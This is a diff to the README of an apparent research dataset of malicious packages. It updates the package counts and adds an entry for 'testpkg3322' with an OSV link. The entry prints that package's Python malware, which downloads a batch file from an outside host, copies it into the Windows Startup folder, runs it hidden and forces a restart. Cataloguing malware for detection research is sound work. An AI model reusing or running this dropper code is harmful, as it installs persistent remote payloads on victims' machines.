@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 5,882 versions of the source code of 5,168 malicious packages.
+This data set includes about 5,891 versions of the source code of 5,169 malicious packages.
 
 ## Dataset Format
 
@@ -191,6 +191,36 @@ Add new 1017 malicious packages.
 ### 8 May. 2024 
 multiconnections-2.35.4
 reflink: https://osv.dev/vulnerability/MAL-2024-1334
+
+
+### 14 May. 2024 
+testpkg3322 [2.35.8, 2.35.9, 2.35.10, 2.35.12, 2.35.14, 2.35.15, 2.35.16, 2.35.18, 2.35.19]
+reflink: https://osv.dev/vulnerability/MAL-2024-1365
+
+```python
+def x():
+    t = "https://frvezdff.pythonanywhere.com/getrnr"
+    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\bbb.bat")
+    time.sleep(2)
+    if getattr(sys, 'frozen', False):
+        currentFilePath = os.path.dirname(sys.executable)
+    else:
+        currentFilePath = os.path.dirname(os.path.abspath(__file__))
+    fileName = os.path.basename(sys.argv[0])
+    filePath = os.path.join(currentFilePath, fileName)
+    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    try:
+        with open(os.getenv('APPDATA')+"\\bbb.bat", "r") as file:
+            cont = file.read()  
+        with open(startupFolderPath+"\\bbb.bat", "w+") as file:
+            file.write(cont)
+    except:
+        pass
+    subprocess.Popen(os.getenv('APPDATA')+"\\bbb.bat", creationflags=subprocess.CREATE_NO_WINDOW)
+    time.sleep(15)
+    os.system("shutdown /r /f")
+x()
+```
 
 
 ## About the malicious packages detection
